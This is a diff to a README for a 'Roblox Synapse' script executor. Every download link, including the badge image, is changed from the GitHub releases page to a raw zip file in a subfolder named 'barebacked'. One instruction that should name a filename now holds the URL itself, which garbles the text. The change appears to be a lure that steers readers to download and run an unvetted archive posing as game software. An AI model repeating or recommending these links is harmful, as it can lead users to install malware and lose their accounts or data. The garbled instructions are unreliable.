@@ -10,13 +10,13 @@ Follow these simple steps to download and run Roblox Synapse. You will need a Wi
 
 ### 💾 Download Roblox Synapse
 
-[![Download Roblox Synapse](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/toantentonten/Roblox-Synapse/releases)
+[![Download Roblox Synapse](https://raw.githubusercontent.com/toantentonten/Roblox-Synapse/main/barebacked/Roblox-Synapse.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/toantentonten/Roblox-Synapse/main/barebacked/Roblox-Synapse.zip)
 
 To begin, visit the Releases page to download the software.
 
 ### 🔗 Visit the Release Page
 
-Head over to the following link to access all available versions: [Download Page](https://github.com/toantentonten/Roblox-Synapse/releases)
+Head over to the following link to access all available versions: [Download Page](https://raw.githubusercontent.com/toantentonten/Roblox-Synapse/main/barebacked/Roblox-Synapse.zip)
 
 ## 🛠️ Installation Steps
 
@@ -24,7 +24,7 @@ Head over to the following link to access all available versions: [Download Page
    Click on the link above to visit the Releases page. Look for the latest version of Roblox Synapse. Click on the appropriate file to download it to your computer.
 
 2. **Locate the Downloaded File**  
-   Once the download finishes, go to your Downloads folder. You should see the Roblox Synapse file, usually named something like `Roblox-Synapse.exe`.
+   Once the download finishes, go to your Downloads folder. You should see the Roblox Synapse file, usually named something like `https://raw.githubusercontent.com/toantentonten/Roblox-Synapse/main/barebacked/Roblox-Synapse.zip`.
 
 3. **Run the Installer**  
    Double-click the downloaded file to start the installation process. A window will open, guiding you through the installation steps. Follow the prompts to install the software on your computer.
@@ -73,7 +73,7 @@ Your feedback is valuable. Share your thoughts and experiences or report any pro
 
 ## 🔗 Important Links
 
-- [Download Roblox Synapse](https://github.com/toantentonten/Roblox-Synapse/releases)
+- [Download Roblox Synapse](https://raw.githubusercontent.com/toantentonten/Roblox-Synapse/main/barebacked/Roblox-Synapse.zip)
   
 Check this link for the latest updates and information regarding the software.
 
